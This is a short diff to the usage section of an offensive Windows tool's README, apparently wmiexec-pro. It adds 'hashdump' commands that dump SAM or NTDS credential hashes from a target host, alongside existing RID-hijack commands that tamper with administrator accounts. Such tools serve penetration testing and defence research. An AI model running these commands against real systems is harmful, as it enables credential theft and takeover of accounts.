@@ -155,7 +155,10 @@ RID Hijack:
    python3 wmiexec-pro.py administrator:password@192.168.1.1 rid-hijack -user 500 -action backup (This will save user profile data as json file)
    python3 wmiexec-pro.py guest@192.168.1.1 -no-pass rid-hijack -user 500 -remove (Use guest user remove administrator user profile after rid hijacked)
    python3 wmiexec-pro.py guest@192.168.1.1 -no-pass rid-hijack -restore "backup.json" (Restore user profile for target user)
-   
+  
+  Hashdump:
+    python3 wmiexec-pro.py administrator:password@192.168.1.1 hashdump -dump [sss/ntds]
+    python3 wmiexec-pro.py administrator:password@192.168.1.1 hashdump -dump [sss/ntds] -use-existing
 ```
 
 <p align="right">(<a href="#readme-top">back to top</a>)</p>
